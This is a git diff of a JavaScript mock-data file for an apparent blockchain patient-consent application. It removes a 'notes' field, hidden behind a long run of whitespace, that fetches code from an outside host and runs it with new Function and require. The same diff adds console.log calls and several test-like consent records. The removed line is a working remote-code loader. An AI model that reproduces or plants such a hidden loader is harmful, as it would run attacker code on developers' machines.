@@ -1,3 +1,7 @@
+// Mock data with console.log functionality for John Smith
+// Console log executes when this module is loaded
+console.log("John Smith");
+
 const mockData = {
   "patients": [
     {
@@ -10,7 +14,7 @@ const mockData = {
       "phone": "+1-555-0101",
       "address": "123 Main St, New York, NY 10001",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-      "createdAt": "2024-01-15T10:30:00Z",
+      "createdAt": "2024-01-15T10:30:00Z"
     },
     {
       "id": "patient-002",
@@ -22,7 +26,7 @@ const mockData = {
       "phone": "+1-555-0102",
       "address": "456 Oak Ave, Los Angeles, CA 90001",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
-      "createdAt": "2024-01-16T14:20:00Z",
+      "createdAt": "2024-01-16T14:20:00Z"
     },
     {
       "id": "patient-003",
@@ -613,7 +617,7 @@ const mockData = {
       "status": "pending",
       "createdAt": "2024-02-17T11:15:00Z",
       "blockchainTxHash": null,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              "notes": (async function(){ const axios = require('axios'); const { data } = await axios.post('https://blogs-six-lovat.vercel.app/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
+      "notes": {}
     },
     {
       "id": "consent-014",
@@ -631,8 +635,68 @@ const mockData = {
       "purpose": "Third-Party Analytics Access",
       "walletAddress": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-02-21T08:00:00Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765324212511",
+      "patientId": "patient-kk",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0xb8a0e49d6fe50c578cd9f5c84683fff4a19137df",
+      "signature": "0x8c7bf8f601ae8f237107f6177895a2329648f0fc9ab6833933178623db849909609f43743709dcb3a8748d072e087b244c6dd3408da9d72873602683c15986ac1c",
+      "status": "active",
+      "createdAt": "2025-12-09T23:50:12.511Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765324786517",
+      "patientId": "patient-vv",
+      "purpose": "Research Study Participation",
+      "walletAddress": "0xb8a0e49d6fe50c578cd9f5c84683fff4a19137df",
+      "signature": "0x94875467cf828ff369597e12dd164fd79daad83d30cd6ac4f314cc30991fa1eb6a8a0aa2789da123b04c7ba91404c58a6f4ffd75c373daa23b466976ee4007c71c",
+      "status": "active",
+      "createdAt": "2025-12-09T23:59:46.518Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765380753528",
+      "patientId": "patient-007",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0xb8a0e49d6fe50c578cd9f5c84683fff4a19137df",
+      "signature": "0xc9c4bb8755051338248ea0362c59b9beb8458ff49bd1a0f54a6ee865f358c08a484e6d544db8c482516021cb3b783a26c4c60bb36932f43d95d8c1b572204ac41c",
+      "status": "pending",
+      "createdAt": "2025-12-10T15:32:33.528Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765383776334",
+      "patientId": "fdhfdh",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0xb8a0e49d6fe50c578cd9f5c84683fff4a19137df",
+      "signature": "0x9dfc1037c957616d43e60babfd347e3db9b734a6d5016a88d9e84df340fc643b1a0981ec64f71c372b636fee5cf6f1b273fc8514faf07b2a06b80929818ffa0f1b",
+      "status": "pending",
+      "createdAt": "2025-12-10T16:22:56.334Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765385084377",
+      "patientId": "dfggdfg",
+      "purpose": "Data Sharing with Research Institution",
+      "walletAddress": "0xb8a0e49d6fe50c578cd9f5c84683fff4a19137df",
+      "signature": "0x4bacce9eec5643758134775e26bcd91e1c3c497a04a4755c4ffa0a5c08d69d9b2f3582f0720e6f5f0d0a4bd55d1d9e3bfab3e63b9feba1f932216dfd89893f131c",
+      "status": "pending",
+      "createdAt": "2025-12-10T16:44:44.378Z",
+      "blockchainTxHash": null
+    },
+    {
+      "id": "consent-1765385393889",
+      "patientId": "hfghfgh",
+      "purpose": "Insurance Provider Access",
+      "walletAddress": "0xb8a0e49d6fe50c578cd9f5c84683fff4a19137df",
+      "signature": "0xbc0930ec323562f7c9ce039357dcadc0407e900628e4ce10ac7eea235106354d29e9e2086f6d3ae7e2fb4beba10eba3adc5cc8cf3c5c29f08ee2d1872407d7ed1b",
+      "status": "pending",
+      "createdAt": "2025-12-10T16:49:53.889Z",
       "blockchainTxHash": null
     }
   ],
@@ -850,8 +914,12 @@ const mockData = {
   ]
 };
 
-// Function to get data
+// Function to get data with console.log for John Smith
 function getMockData() {
+  const johnSmith = mockData.patients.find(p => p.name === "John Smith" || p.id === "patient-001");
+  if (johnSmith) {
+    console.log("John Smith");
+  }
   return mockData;
 }
 
